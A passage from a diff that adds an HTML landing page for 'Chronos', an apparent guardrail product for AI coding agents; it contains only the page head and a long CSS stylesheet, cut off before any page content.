@@ -1,0 +1,2765 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Chronos — AI Engineering Control Plane for Autonomous Coding Agents</title>
+<meta name="description" content="Guardrails, zero-path AST context, sub-file intent locking, and cryptographic auditability for Claude Code, OpenHands, Devin, and team coding agents.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,400;0,500;1,400&family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #08090d;
+  --surface: #0f1118;
+  --surface-alt: #121520;
+  --card: #151822;
+  --card-hover: #191d2a;
+  --card-active: #1d2232;
+  --border: #252a39;
+  --border-subtle: #1a1e2b;
+  --border-focus: rgba(0, 242, 255, 0.45);
+  --muted: #8991a5;
+  --text: #edf1fa;
+  --text-dim: #b8c4d9;
+  --cyan: #00f2ff;
+  --cyan-glow: rgba(0, 242, 255, 0.18);
+  --cyan-dim: rgba(0, 242, 255, 0.08);
+  --green: #10b981;
+  --green-glow: rgba(16, 185, 129, 0.2);
+  --amber: #f59e0b;
+  --amber-glow: rgba(245, 158, 11, 0.2);
+  --red: #ef4444;
+  --red-glow: rgba(239, 68, 68, 0.2);
+  --violet: #8b5cf6;
+  --violet-glow: rgba(139, 92, 246, 0.2);
+  --mono: "DM Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+  --sans: Inter, -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+  --ease: cubic-bezier(0.16, 1, 0.3, 1);
+  --container-max: 1240px;
+}
+
+*, *::before, *::after {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+html {
+  scroll-behavior: smooth;
+  font-size: 14px;
+}
+
+body {
+  background-color: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  font-size: 14px;
+  line-height: 1.6;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  overflow-x: hidden;
+}
+
+/* Background Cyber Grid Accent */
+.bg-grid-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-image: 
+    linear-gradient(to right, rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+    linear-gradient(to bottom, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+  background-size: 48px 48px;
+  pointer-events: none;
+  z-index: 0;
+}
+
+.ambient-glow {
+  position: fixed;
+  top: -150px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 900px;
+  height: 500px;
+  background: radial-gradient(circle, rgba(0, 242, 255, 0.07) 0%, rgba(139, 92, 246, 0.03) 45%, transparent 70%);
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* Container */
+.container {
+  width: 100%;
+  max-width: var(--container-max);
+  margin-left: auto;
+  margin-right: auto;
+  padding-left: 24px;
+  padding-right: 24px;
+  position: relative;
+  z-index: 1;
+}
+
+/* Typography Helpers */
+h1, h2, h3, h4, h5, h6 {
+  color: var(--text);
+  font-weight: 700;
+  line-height: 1.25;
+}
+
+p {
+  color: var(--text-dim);
+}
+
+a {
+  color: var(--cyan);
+  text-decoration: none;
+  transition: color 0.15s var(--ease);
+}
+a:hover {
+  color: #fff;
+}
+
+code, pre {
+  font-family: var(--mono);
+}
+
+/* Buttons */
+.btn {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  padding: 10px 18px;
+  border-radius: 8px;
+  font-weight: 600;
+  font-size: 13px;
+  border: 1px solid var(--border);
+  background: #1b2030;
+  color: var(--text);
+  cursor: pointer;
+  transition: all 0.18s var(--ease);
+  text-decoration: none;
+  white-space: nowrap;
+}
+
+.btn:hover {
+  background: #232a3d;
+  border-color: #566078;
+  color: #fff;
+  transform: translateY(-1px);
+}
+
+.btn:active {
+  transform: translateY(0);
+}
+
+.btn-primary {
+  background: #08373e;
+  border-color: #0b7c89;
+  color: #c4fbff;
+  box-shadow: 0 0 16px var(--cyan-glow);
+}
+
+.btn-primary:hover {
+  background: #0d4a54;
+  border-color: var(--cyan);
+  color: #fff;
+  box-shadow: 0 0 24px rgba(0, 242, 255, 0.3);
+}
+
+.btn-outline {
+  background: transparent;
+  border-color: var(--border);
+  color: var(--text);
+}
+
+.btn-outline:hover {
+  background: rgba(255, 255, 255, 0.04);
+  border-color: var(--text-dim);
+}
+
+.btn-sm {
+  padding: 6px 12px;
+  font-size: 12px;
+  border-radius: 6px;
+}
+
+.btn-lg {
+  padding: 13px 24px;
+  font-size: 14px;
+  border-radius: 9px;
+}
+
+/* Badges */
+.badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  padding: 4px 10px;
+  border-radius: 999px;
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: 0.04em;
+  text-transform: uppercase;
+  border: 1px solid var(--border);
+  background: rgba(255, 255, 255, 0.03);
+  color: var(--text-dim);
+}
+
+.badge-cyan {
+  border-color: rgba(0, 242, 255, 0.4);
+  background: rgba(0, 242, 255, 0.08);
+  color: var(--cyan);
+}
+
+.badge-green {
+  border-color: rgba(16, 185, 129, 0.4);
+  background: rgba(16, 185, 129, 0.08);
+  color: var(--green);
+}
+
+.badge-amber {
+  border-color: rgba(245, 158, 11, 0.4);
+  background: rgba(245, 158, 11, 0.08);
+  color: var(--amber);
+}
+
+.badge-red {
+  border-color: rgba(239, 68, 68, 0.4);
+  background: rgba(239, 68, 68, 0.08);
+  color: var(--red);
+}
+
+.badge-violet {
+  border-color: rgba(139, 92, 246, 0.4);
+  background: rgba(139, 92, 246, 0.08);
+  color: var(--violet);
+}
+
+/* Header & Nav */
+.header {
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  background: rgba(8, 9, 13, 0.85);
+  backdrop-filter: blur(14px);
+  -webkit-backdrop-filter: blur(14px);
+  border-bottom: 1px solid var(--border-subtle);
+  transition: border-color 0.2s var(--ease);
+}
+
+.nav-container {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  height: 68px;
+}
+
+.brand {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  text-decoration: none;
+  color: var(--text);
+}
+
+.logo-cube {
+  width: 34px;
+  height: 34px;
+  border: 1px solid rgba(0, 242, 255, 0.6);
+  border-radius: 9px;
+  display: grid;
+  place-items: center;
+  color: var(--cyan);
+  font-weight: 800;
+  font-size: 18px;
+  font-family: var(--mono);
+  background: radial-gradient(circle at center, rgba(0, 242, 255, 0.22) 0%, transparent 75%);
+  box-shadow: 0 0 16px rgba(0, 242, 255, 0.25);
+  animation: logoPulse 4s infinite ease-in-out;
+}
+
+@keyframes logoPulse {
+  0%, 100% { box-shadow: 0 0 14px rgba(0, 242, 255, 0.18); border-color: rgba(0, 242, 255, 0.5); }
+  50% { box-shadow: 0 0 24px rgba(0, 242, 255, 0.42); border-color: var(--cyan); }
+}
+
+.brand-text {
+  display: flex;
+  flex-direction: column;
+}
+
+.brand-title {
+  font-size: 16px;
+  font-weight: 800;
+  letter-spacing: 0.12em;
+  color: #fff;
+  line-height: 1.1;
+}
+
+.brand-subtitle {
+  font-size: 10px;
+  letter-spacing: 0.08em;
+  color: var(--muted);
+  text-transform: uppercase;
+  font-family: var(--mono);
+}
+
+.nav-links {
+  display: flex;
+  align-items: center;
+  gap: 24px;
+  list-style: none;
+}
+
+.nav-link {
+  color: var(--text-dim);
+  font-size: 13px;
+  font-weight: 500;
+  transition: color 0.15s var(--ease);
+}
+.nav-link:hover {
+  color: var(--cyan);
+}
+
+.nav-actions {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.mobile-menu-toggle {
+  display: none;
+  background: none;
+  border: none;
+  color: var(--text);
+  cursor: pointer;
+  padding: 8px;
+}
+
+/* Hero Section */
+.hero {
+  padding: 80px 0 64px;
+  position: relative;
+}
+
+.hero-inner {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+}
+
+.hero-badge-row {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 24px;
+  flex-wrap: wrap;
+  justify-content: center;
+}
+
+.hero-headline {
+  font-size: clamp(32px, 5.2vw, 56px);
+  font-weight: 900;
+  letter-spacing: -0.03em;
+  line-height: 1.1;
+  max-width: 950px;
+  margin-bottom: 20px;
+  background: linear-gradient(180deg, #ffffff 30%, #b8c4d9 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+.hero-headline span.accent {
+  background: linear-gradient(90deg, #00f2ff, #72f7ff);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+.hero-subtitle {
+  font-size: clamp(15px, 1.8vw, 18px);
+  color: var(--text-dim);
+  max-width: 760px;
+  line-height: 1.6;
+  margin-bottom: 36px;
+}
+
+.hero-cta-group {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  margin-bottom: 36px;
+  flex-wrap: wrap;
+  justify-content: center;
+}
+
+.install-bar {
+  display: flex;
+  align-items: center;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 9px;
+  padding: 4px 6px 4px 14px;
+  gap: 12px;
+  font-family: var(--mono);
+  font-size: 13px;
+  color: var(--cyan);
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+}
+
+.install-command {
+  user-select: all;
+  color: #fff;
+}
+.install-command span.prompt {
+  color: var(--muted);
+  user-select: none;
+}
+
+.copy-btn {
+  padding: 6px 12px;
+  background: #1e2436;
+  border: 1px solid var(--border);
+  color: var(--text);
+  border-radius: 6px;
+  font-size: 12px;
+  cursor: pointer;
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+  transition: all 0.15s var(--ease);
+}
+.copy-btn:hover {
+  background: #2a334c;
+  color: #fff;
+  border-color: var(--cyan);
+}
+
+.hero-stats-banner {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 16px;
+  width: 100%;
+  max-width: 1020px;
+  margin-top: 36px;
+  margin-bottom: 48px;
+}
+
+.stat-pill {
+  background: var(--surface);
+  border: 1px solid var(--border-subtle);
+  border-radius: 10px;
+  padding: 16px 18px;
+  text-align: left;
+  transition: border-color 0.2s var(--ease);
+}
+.stat-pill:hover {
+  border-color: var(--border);
+}
+
+.stat-number {
+  font-size: 24px;
+  font-weight: 800;
+  font-family: var(--mono);
+  color: #fff;
+  display: flex;
+  align-items: baseline;
+  gap: 4px;
+  line-height: 1.2;
+}
+
+.stat-number .highlight {
+  color: var(--cyan);
+}
+
+.stat-label {
+  font-size: 11px;
+  text-transform: uppercase;
+  color: var(--muted);
+  letter-spacing: 0.05em;
+  margin-top: 4px;
+  font-weight: 600;
+}
+
+/* Interactive Simulator / Terminal */
+.sim-container {
+  width: 100%;
+  max-width: 1040px;
+  background: #0b0d14;
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  overflow: hidden;
+  box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 30px rgba(0, 242, 255, 0.08);
+  margin-bottom: 24px;
+}
+
+.sim-topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background: #11141e;
+  border-bottom: 1px solid var(--border);
+  padding: 10px 18px;
+}
+
+.sim-dots {
+  display: flex;
+  gap: 8px;
+}
+.sim-dot {
+  width: 11px;
+  height: 11px;
+  border-radius: 50%;
+}
+.sim-dot.red { background: #ff5f56; }
+.sim-dot.yellow { background: #ffbd2e; }
+.sim-dot.green { background: #27c93f; }
+
+.sim-tabs {
+  display: flex;
+  gap: 8px;
+}
+
+.sim-tab-btn {
+  background: transparent;
+  border: 1px solid transparent;
+  color: var(--muted);
+  font-size: 12px;
+  font-weight: 600;
+  padding: 6px 14px;
+  border-radius: 6px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  transition: all 0.15s var(--ease);
+}
+
+.sim-tab-btn:hover {
+  color: var(--text);
+  background: rgba(255, 255, 255, 0.03);
+}
+
+.sim-tab-btn.active {
+  background: #191f2e;
+  border-color: var(--border);
+  color: var(--cyan);
+}
+
+.sim-terminal-body {
+  padding: 22px 24px;
+  font-family: var(--mono);
+  font-size: 13px;
+  min-height: 280px;
+  text-align: left;
+  line-height: 1.7;
+  overflow-x: auto;
+}
+
+.terminal-line {
+  margin-bottom: 8px;
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+}
+
+.term-tag {
+  display: inline-block;
+  padding: 1px 7px;
+  border-radius: 4px;
+  font-size: 11px;
+  font-weight: 700;
+  text-transform: uppercase;
+}
+.term-tag.ask { background: rgba(245, 158, 11, 0.2); color: var(--amber); border: 1px solid rgba(245, 158, 11, 0.4); }
+.term-tag.deny { background: rgba(239, 68, 68, 0.2); color: var(--red); border: 1px solid rgba(239, 68, 68, 0.4); }
+.term-tag.allow { background: rgba(16, 185, 129, 0.2); color: var(--green); border: 1px solid rgba(16, 185, 129, 0.4); }
+.term-tag.lock { background: rgba(139, 92, 246, 0.2); color: var(--violet); border: 1px solid rgba(139, 92, 246, 0.4); }
+.term-tag.fail { background: rgba(239, 68, 68, 0.3); color: #ffa2a2; font-weight: 800; }
+
+.term-cmd { color: #fff; font-weight: 600; }
+.term-reason { color: var(--text-dim); }
+.term-muted { color: var(--muted); }
+
+/* Problem Statement / Tension Section */
+.section {
+  padding: 96px 0;
+  position: relative;
+}
+
+.section-alt {
+  background: #0b0d14;
+  border-top: 1px solid var(--border-subtle);
+  border-bottom: 1px solid var(--border-subtle);
+}
+
+.section-header {
+  text-align: center;
+  max-width: 760px;
+  margin: 0 auto 56px;
+}
+
+.section-tag {
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  color: var(--cyan);
+  font-family: var(--mono);
+  margin-bottom: 12px;
+  display: block;
+}
+
+.section-title {
+  font-size: clamp(26px, 3.4vw, 40px);
+  font-weight: 800;
+  letter-spacing: -0.02em;
+  margin-bottom: 16px;
+  color: #fff;
+}
+
+.section-desc {
+  font-size: 16px;
+  color: var(--text-dim);
+  line-height: 1.6;
+}
+
+/* Problem Grid */
+.problem-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 24px;
+}
+
+.problem-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 28px;
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+  transition: all 0.2s var(--ease);
+  position: relative;
+  overflow: hidden;
+}
+
+.problem-card::before {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 4px;
+  height: 100%;
+  background: var(--red);
+  opacity: 0.8;
+}
+
+.problem-card:hover {
+  transform: translateY(-2px);
+  border-color: #3b445c;
+  background: var(--card);
+}
+
+.problem-icon-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.icon-box {
+  width: 44px;
+  height: 44px;
+  border-radius: 8px;
+  display: grid;
+  place-items: center;
+  background: rgba(255, 255, 255, 0.03);
+  border: 1px solid var(--border);
+  color: var(--cyan);
+}
+
+.problem-title {
+  font-size: 18px;
+  font-weight: 700;
+  color: #fff;
+}
+
+.problem-desc {
+  color: var(--text-dim);
+  font-size: 14px;
+  line-height: 1.6;
+}
+
+.problem-quote {
+  background: #0b0d13;
+  border-left: 2px solid var(--border);
+  padding: 10px 14px;
+  font-family: var(--mono);
+  font-size: 12px;
+  color: #d88e8e;
+  border-radius: 0 6px 6px 0;
+}
+
+/* Architecture Flow Section */
+.arch-diagram-wrapper {
+  background: #0a0d15;
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  padding: 40px;
+  position: relative;
+  overflow: hidden;
+}
+
+.arch-flow {
+  display: grid;
+  grid-template-columns: 240px 1fr 240px;
+  gap: 28px;
+  align-items: center;
+}
+
+.arch-col {
+  display: flex;
+  flex-direction: column;
+  gap: 14px;
+}
+
+.arch-col-title {
+  font-size: 11px;
+  font-family: var(--mono);
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--muted);
+  text-align: center;
+}
+
+.arch-node {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 14px 18px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-size: 13px;
+  font-weight: 600;
+  color: #fff;
+  transition: all 0.2s var(--ease);
+}
+
+.arch-node:hover {
+  border-color: var(--cyan);
+  box-shadow: 0 0 16px var(--cyan-glow);
+}
+
+.arch-core {
+  background: #0f1422;
+  border: 1px solid var(--border-focus);
+  border-radius: 12px;
+  padding: 24px;
+  box-shadow: 0 0 30px rgba(0, 242, 255, 0.08);
+  position: relative;
+}
+
+.arch-core-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 20px;
+  padding-bottom: 12px;
+  border-bottom: 1px solid var(--border);
+}
+
+.arch-core-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 14px;
+}
+
+.core-module {
+  background: #151a2a;
+  border: 1px solid var(--border-subtle);
+  border-radius: 8px;
+  padding: 14px;
+}
+
+.core-module-title {
+  font-size: 13px;
+  font-weight: 700;
+  color: var(--cyan);
+  margin-bottom: 6px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.core-module-desc {
+  font-size: 12px;
+  color: var(--text-dim);
+  line-height: 1.4;
+}
+
+/* Feature Pillars Grid */
+.pillars-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 28px;
+}
+
+.pillar-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  padding: 32px;
+  display: flex;
+  flex-direction: column;
+  gap: 20px;
+  transition: all 0.2s var(--ease);
+  position: relative;
+}
+
+.pillar-card:hover {
+  border-color: #424e6c;
+  background: var(--card);
+  transform: translateY(-2px);
+}
+
+.pillar-header {
+  display: flex;
+  align-items: flex-start;
+  gap: 16px;
+}
+
+.pillar-icon-box {
+  width: 48px;
+  height: 48px;
+  border-radius: 10px;
+  background: #161b2a;
+  border: 1px solid var(--border);
+  display: grid;
+  place-items: center;
+  flex-shrink: 0;
+}
+
+.pillar-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: #fff;
+  margin-bottom: 4px;
+}
+
+.pillar-subtitle {
+  font-size: 12px;
+  font-family: var(--mono);
+  color: var(--cyan);
+}
+
+.pillar-body {
+  color: var(--text-dim);
+  font-size: 14px;
+  line-height: 1.6;
+}
+
+.pillar-feature-list {
+  list-style: none;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  margin-top: 8px;
+}
+
+.pillar-feature-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  font-size: 13px;
+  color: var(--text);
+}
+
+.pillar-feature-item svg {
+  flex-shrink: 0;
+  margin-top: 3px;
+  color: var(--green);
+}
+
+.pillar-snippet {
+  background: #090a0f;
+  border: 1px solid var(--border-subtle);
+  border-radius: 8px;
+  padding: 12px 16px;
+  font-family: var(--mono);
+  font-size: 12px;
+  color: #b8c4d9;
+}
+
+/* Benchmark Case Study */
+.benchmark-box {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  overflow: hidden;
+  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+}
+
+.benchmark-hero-banner {
+  background: linear-gradient(90deg, #101625 0%, #161c2f 100%);
+  border-bottom: 1px solid var(--border);
+  padding: 24px 32px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 16px;
+}
+
+.benchmark-title {
+  font-size: 18px;
+  font-weight: 700;
+  color: #fff;
+}
+.benchmark-repo {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--cyan);
+}
+
+.benchmark-stats-grid {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  divide-x: 1px solid var(--border);
+  background: #0a0d14;
+}
+
+.bm-stat {
+  padding: 28px 24px;
+  text-align: center;
+  border-right: 1px solid var(--border);
+}
+.bm-stat:last-child {
+  border-right: none;
+}
+
+.bm-delta {
+  font-size: 28px;
+  font-weight: 800;
+  font-family: var(--mono);
+  color: var(--green);
+  line-height: 1.1;
+  margin-bottom: 6px;
+}
+
+.bm-flow {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--muted);
+  margin-bottom: 6px;
+}
+
+.bm-label {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text-dim);
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+}
+
+.benchmark-table-wrap {
+  padding: 24px 32px;
+  overflow-x: auto;
+}
+
+.data-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 13px;
+  text-align: left;
+}
+
+.data-table th {
+  padding: 10px 14px;
+  color: var(--muted);
+  font-family: var(--mono);
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  border-bottom: 1px solid var(--border);
+}
+
+.data-table td {
+  padding: 12px 14px;
+  border-bottom: 1px solid var(--border-subtle);
+  color: var(--text);
+}
+
+.data-table tr:hover td {
+  background: rgba(255, 255, 255, 0.02);
+}
+
+.data-table code {
+  color: var(--cyan);
+  background: rgba(0, 242, 255, 0.06);
+  padding: 2px 6px;
+  border-radius: 4px;
+}
+
+/* Interactive Policy Explorer */
+.rules-explorer {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  overflow: hidden;
+}
+
+.rules-toolbar {
+  padding: 16px 24px;
+  background: #111522;
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 12px;
+}
+
+.rule-category-filters {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+}
+
+.filter-btn {
+  background: #191f2f;
+  border: 1px solid var(--border);
+  color: var(--text-dim);
+  padding: 6px 12px;
+  border-radius: 6px;
+  font-size: 12px;
+  cursor: pointer;
+  transition: all 0.15s var(--ease);
+}
+.filter-btn:hover {
+  color: #fff;
+  border-color: #556282;
+}
+.filter-btn.active {
+  background: #093740;
+  border-color: var(--cyan);
+  color: #c5fbff;
+}
+
+.rules-list {
+  display: flex;
+  flex-direction: column;
+}
+
+.rule-item {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 24px;
+  border-bottom: 1px solid var(--border-subtle);
+  transition: background 0.15s var(--ease);
+  gap: 16px;
+}
+.rule-item:last-child {
+  border-bottom: none;
+}
+.rule-item:hover {
+  background: rgba(255, 255, 255, 0.02);
+}
+
+.rule-main {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  flex: 1;
+}
+
+.rule-id {
+  font-family: var(--mono);
+  font-size: 13px;
+  font-weight: 600;
+  color: #fff;
+  min-width: 180px;
+}
+
+.rule-desc {
+  font-size: 13px;
+  color: var(--text-dim);
+}
+
+.rule-action-pill {
+  font-family: var(--mono);
+  font-size: 11px;
+  font-weight: 700;
+  padding: 3px 10px;
+  border-radius: 4px;
+  text-transform: uppercase;
+  flex-shrink: 0;
+}
+
+/* Interactive ROI Calculator */
+.calc-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  padding: 40px;
+  display: grid;
+  grid-template-columns: 1.2fr 1fr;
+  gap: 40px;
+  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+}
+
+.calc-inputs {
+  display: flex;
+  flex-direction: column;
+  gap: 28px;
+}
+
+.calc-field {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+.calc-label-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.calc-label {
+  font-weight: 600;
+  font-size: 14px;
+  color: #fff;
+}
+
+.calc-val-badge {
+  font-family: var(--mono);
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--cyan);
+}
+
+.range-slider {
+  -webkit-appearance: none;
+  width: 100%;
+  height: 6px;
+  border-radius: 3px;
+  background: #1c2233;
+  outline: none;
+  cursor: pointer;
+}
+
+.range-slider::-webkit-slider-thumb {
+  -webkit-appearance: none;
+  appearance: none;
+  width: 18px;
+  height: 18px;
+  border-radius: 50%;
+  background: var(--cyan);
+  box-shadow: 0 0 10px rgba(0, 242, 255, 0.5);
+  cursor: pointer;
+  transition: transform 0.1s var(--ease);
+}
+.range-slider::-webkit-slider-thumb:hover {
+  transform: scale(1.15);
+}
+
+.calc-output {
+  background: #0b0e17;
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 32px;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+}
+
+.calc-metric-group {
+  display: flex;
+  flex-direction: column;
+  gap: 20px;
+}
+
+.calc-metric {
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+}
+
+.calc-metric-val {
+  font-size: 32px;
+  font-weight: 900;
+  font-family: var(--mono);
+  color: var(--green);
+  line-height: 1.1;
+}
+
+.calc-metric-label {
+  font-size: 12px;
+  text-transform: uppercase;
+  color: var(--muted);
+  letter-spacing: 0.05em;
+  font-weight: 600;
+}
+
+.calc-footer-note {
+  font-size: 12px;
+  color: var(--muted);
+  border-top: 1px solid var(--border-subtle);
+  padding-top: 16px;
+  line-height: 1.5;
+}
+
+/* AST Sub-File Intent Locking Interactive Visualizer */
+.ast-lock-viz {
+  background: #0b0e17;
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  overflow: hidden;
+  margin-top: 36px;
+}
+
+.ast-viz-bar {
+  padding: 12px 20px;
+  background: #131826;
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.ast-file-tab {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--text);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.ast-code-container {
+  padding: 24px;
+  font-family: var(--mono);
+  font-size: 13px;
+  line-height: 1.8;
+}
+
+.ast-node-block {
+  border-radius: 6px;
+  padding: 12px 16px;
+  margin: 8px 0;
+  transition: all 0.2s var(--ease);
+}
+
+.ast-node-locked-1 {
+  background: rgba(139, 92, 246, 0.12);
+  border-left: 3px solid var(--violet);
+  border: 1px solid rgba(139, 92, 246, 0.3);
+}
+
+.ast-node-available {
+  background: rgba(16, 185, 129, 0.06);
+  border-left: 3px solid var(--green);
+  border: 1px solid rgba(16, 185, 129, 0.2);
+}
+
+.ast-node-locked-2 {
+  background: rgba(0, 242, 255, 0.1);
+  border-left: 3px solid var(--cyan);
+  border: 1px solid rgba(0, 242, 255, 0.3);
+}
+
+.ast-tag {
+  float: right;
+  font-size: 11px;
+  padding: 2px 8px;
+  border-radius: 4px;
+}
+
+/* Pricing Grid */
+.pricing-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 24px;
+  align-items: stretch;
+}
+
+.pricing-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  padding: 36px 30px;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  transition: all 0.2s var(--ease);
+  position: relative;
+}
+
+.pricing-card:hover {
+  border-color: #434f6e;
+  transform: translateY(-2px);
+}
+
+.pricing-card.featured {
+  background: #111624;
+  border-color: var(--cyan);
+  box-shadow: 0 0 35px rgba(0, 242, 255, 0.12);
+}
+
+.pricing-badge-popular {
+  position: absolute;
+  top: -12px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: var(--cyan);
+  color: #08090d;
+  font-weight: 800;
+  font-size: 10px;
+  letter-spacing: 0.1em;
+  padding: 4px 12px;
+  border-radius: 999px;
+  text-transform: uppercase;
+}
+
+.tier-name {
+  font-size: 20px;
+  font-weight: 800;
+  color: #fff;
+  margin-bottom: 8px;
+}
+
+.tier-desc {
+  font-size: 13px;
+  color: var(--text-dim);
+  margin-bottom: 24px;
+  min-height: 40px;
+}
+
+.tier-price-row {
+  display: flex;
+  align-items: baseline;
+  gap: 6px;
+  margin-bottom: 24px;
+}
+
+.tier-price {
+  font-size: 40px;
+  font-weight: 900;
+  font-family: var(--mono);
+  color: #fff;
+  line-height: 1;
+}
+
+.tier-period {
+  font-size: 13px;
+  color: var(--muted);
+}
+
+.tier-features {
+  list-style: none;
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  margin-bottom: 32px;
+}
+
+.tier-feature {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  font-size: 13px;
+  color: var(--text);
+}
+
+.tier-feature svg {
+  flex-shrink: 0;
+  color: var(--cyan);
+  margin-top: 3px;
+}
+
+/* FAQ Accordion */
+.faq-grid {
+  max-width: 860px;
+  margin: 0 auto;
+  display: flex;
+  flex-direction: column;
+  gap: 14px;
+}
+
+.faq-item {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  overflow: hidden;
+  transition: border-color 0.15s var(--ease);
+}
+
+.faq-item:hover {
+  border-color: #3b455f;
+}
+
+.faq-question {
+  width: 100%;
+  text-align: left;
+  padding: 20px 24px;
+  background: none;
+  border: none;
+  color: #fff;
+  font-size: 15px;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  cursor: pointer;
+  gap: 16px;
+}
+
+.faq-chevron {
+  transition: transform 0.2s var(--ease);
+  color: var(--cyan);
+  flex-shrink: 0;
+}
+
+.faq-item.open .faq-chevron {
+  transform: rotate(180deg);
+}
+
+.faq-answer {
+  max-height: 0;
+  overflow: hidden;
+  transition: max-height 0.3s var(--ease), padding 0.3s var(--ease);
+  padding: 0 24px;
+  color: var(--text-dim);
+  font-size: 14px;
+  line-height: 1.6;
+}
+
+.faq-item.open .faq-answer {
+  max-height: 300px;
+  padding: 0 24px 20px;
+}
+
+/* Final CTA Section */
+.cta-banner {
